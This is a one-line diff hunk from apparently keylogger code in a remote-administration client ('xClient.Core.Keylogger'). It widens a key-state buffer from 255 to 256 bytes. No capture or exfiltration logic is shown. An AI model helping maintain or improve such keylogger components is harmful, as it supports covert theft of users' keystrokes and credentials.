@@ -33,7 +33,7 @@ namespace xClient.Core.Keylogger.WinApi
         //Used to pass Unicode characters as if they were keystrokes. The VK_PACKET key is the low word of a 32-bit Virtual Key value used for non-keyboard input methods
         private static int lastVirtualKeyCode = 0;
         private static int lastScanCode = 0;
-        private static byte[] lastKeyState = new byte[255];
+        private static byte[] lastKeyState = new byte[256];
         private static bool lastIsDead = false;
 
         /// <summary>
